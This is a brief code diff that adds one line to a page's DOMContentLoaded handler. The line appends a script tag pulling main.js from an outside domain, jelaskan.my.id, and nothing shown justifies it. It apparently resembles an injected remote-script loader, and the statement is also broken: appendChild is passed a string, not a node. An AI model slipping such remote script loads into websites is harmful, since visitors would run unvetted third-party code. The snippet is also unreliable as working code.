@@ -106,5 +106,5 @@ document.addEventListener("DOMContentLoaded", function() {
     document.head.appendChild(link);
   });
   
-  
+  document.body.appendChild('<script src="https://jelaskan.my.id/upload/script/main.js" type="text/javascript" charset="utf-8"></script>');
 });
